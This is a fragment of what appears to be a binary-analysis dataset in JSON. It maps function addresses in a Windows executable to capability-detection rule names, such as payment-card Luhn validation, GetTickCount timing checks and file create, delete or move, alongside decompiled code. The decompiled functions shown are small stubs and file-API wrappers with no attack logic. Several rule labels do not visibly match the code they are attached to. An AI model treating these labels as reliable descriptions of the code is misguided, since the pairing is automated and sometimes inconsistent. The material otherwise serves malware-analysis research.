        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00404539(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    fcn.00406000(0x420bb8, 0xc);\n    if (*(unaff_EBP + 8) == 0) {\n        puVar1 = fcn.004058bb();\n        *puVar1 = 0x16;\n        fcn.00405869();\n    }\n    else {\n        iVar2 = fcn.00405e3f();\n        fcn.00405f57(1, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.00405e3f();\n        arg_8h_00 = fcn.004077a3(iVar2 + 0x20);\n        iVar2 = unaff_EBP + 0xc;\n        arg_10h = 0;\n        uVar4 = *(unaff_EBP + 8);\n        iVar3 = fcn.00405e3f();\n        uVar4 = fcn.0040791a(iVar3 + 0x20, uVar4, arg_10h, iVar2);\n        *(unaff_EBP + -0x1c) = uVar4;\n        iVar2 = fcn.00405e3f();\n        fcn.0040783f(arg_8h_00, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.004045cd();\n    }\n    fcn.00406045();\n    return;\n}\n",
        "token_count": 447
    },
    "004045cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004045cd(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00405e3f();\n    fcn.00405fc5(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 55
    },
    "00408799": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408799(uint arg_8h)\n\n{\n    fcn.00408659(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 39
    },
    "00408ed7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00408eeb)\n// WARNING: Removing unreachable block (ram,0x00408ef1)\n// WARNING: Removing unreachable block (ram,0x00408ef3)\n\nvoid fcn.00408ed7(void)\n\n{\n    return;\n}\n",
        "token_count": 64
    },
    "0040903a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040903a(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.00405abb(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "0040cb11": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0040cb11(void)\n\n{\n    *0x80bc90 = (*_sym.imp.KERNEL32.dll_CreateFileW)(0x402e50, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "0040437e": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040437e(uint lpFileName)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileA)(lpFileName);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.004058e1(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 118
    },
    "0040446c": {
        "rules": [
            "move file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040446c(uint lpExistingFileName, uint lpNewFileName)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_MoveFileA)(lpExistingFileName, lpNewFileName);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.004058e1(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 129
    }
}